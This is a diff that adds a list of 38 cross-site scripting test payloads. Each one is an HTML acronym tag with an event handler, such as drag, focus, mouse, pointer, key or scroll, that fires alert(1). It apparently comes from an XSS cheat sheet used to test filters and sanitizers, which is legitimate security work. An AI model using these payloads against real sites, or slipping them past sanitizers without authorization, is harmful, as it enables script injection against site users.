@@ -1,0 +1,38 @@
+<acronym contenteditable onbeforeinput=alert(1)>test
+<acronym draggable="true" ondrag="alert(1)" style=display:block>test</acronym>
+<acronym draggable="true" ondragend="alert(1)" style=display:block>test</acronym>
+<acronym draggable="true" ondragenter="alert(1)" style=display:block>test</acronym>
+<acronym draggable="true" ondragleave="alert(1)" style=display:block>test</acronym>
+<acronym draggable="true" ondragstart="alert(1)" style=display:block>test</acronym>
+<acronym id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></acronym>
+<acronym id=x tabindex=1 onfocus=alert(1)></acronym>
+<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
+<acronym onafterscriptexecute=alert(1)><script>1</script>
+<acronym onbeforescriptexecute=alert(1)><script>1</script>
+<acronym onblur=alert(1) id=x tabindex=1 style=display:block>test</acronym><input value=clickme>
+<acronym onclick="alert(1)" style=display:block>test</acronym>
+<acronym oncontextmenu="alert(1)" style=display:block>test</acronym>
+<acronym oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<acronym oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<acronym ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</acronym>
+<acronym onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</acronym><input value=clickme>
+<acronym onkeydown="alert(1)" contenteditable style=display:block>test</acronym>
+<acronym onkeypress="alert(1)" contenteditable style=display:block>test</acronym>
+<acronym onkeyup="alert(1)" contenteditable style=display:block>test</acronym>
+<acronym onmousedown="alert(1)" style=display:block>test</acronym>
+<acronym onmouseenter="alert(1)" style=display:block>test</acronym>
+<acronym onmouseleave="alert(1)" style=display:block>test</acronym>
+<acronym onmousemove="alert(1)" style=display:block>test</acronym>
+<acronym onmouseout="alert(1)" style=display:block>test</acronym>
+<acronym onmouseover="alert(1)" style=display:block>test</acronym>
+<acronym onmouseup="alert(1)" style=display:block>test</acronym>
+<acronym onmousewheel=alert(1) style=display:block>requires scrolling
+<acronym onpointerdown=alert(1) style=display:block>XSS</acronym>
+<acronym onpointerenter=alert(1) style=display:block>XSS</acronym>
+<acronym onpointerleave=alert(1) style=display:block>XSS</acronym>
+<acronym onpointermove=alert(1) style=display:block>XSS</acronym>
+<acronym onpointerout=alert(1) style=display:block>XSS</acronym>
+<acronym onpointerover=alert(1) style=display:block>XSS</acronym>
+<acronym onpointerrawupdate=alert(1) style=display:block>XSS</acronym>
+<acronym onpointerup=alert(1) style=display:block>XSS</acronym>
+<acronym onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></acronym>
